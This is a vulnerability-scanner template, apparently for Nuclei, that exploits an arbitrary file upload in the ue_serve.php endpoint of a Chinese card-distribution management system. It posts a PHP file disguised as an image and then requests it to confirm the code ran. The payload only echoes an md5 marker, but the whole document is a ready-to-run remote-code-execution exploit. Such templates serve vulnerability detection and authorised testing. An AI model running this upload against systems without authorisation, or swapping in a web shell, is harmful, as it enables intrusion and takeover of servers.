id: poc-yaml-haokajt-ue-serve-upload
info:
  name: 号卡极团分销管理系统 ue_serve.php 任意文件上传
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----iiqvnofupvhdyrcoqyuujyetjvqgocod

        ------iiqvnofupvhdyrcoqyuujyetjvqgocod
        Content-Disposition: form-data; name="name"
        
        1.php
        ------iiqvnofupvhdyrcoqyuujyetjvqgocod
        Content-Disposition: form-data; name="upfile"; filename="1.php"
        Content-Type: image/jpeg
        
        This website has a vulnerability!!! <?php echo md5({{t1}});?>
        ------iiqvnofupvhdyrcoqyuujyetjvqgocod--
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        group: 1
        name: filename
        internal: true
        regex:
          - '/upload\\/(.*?).php'

  - raw:
      - |
        GET /upload/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
          - "This website has a vulnerability!!!"
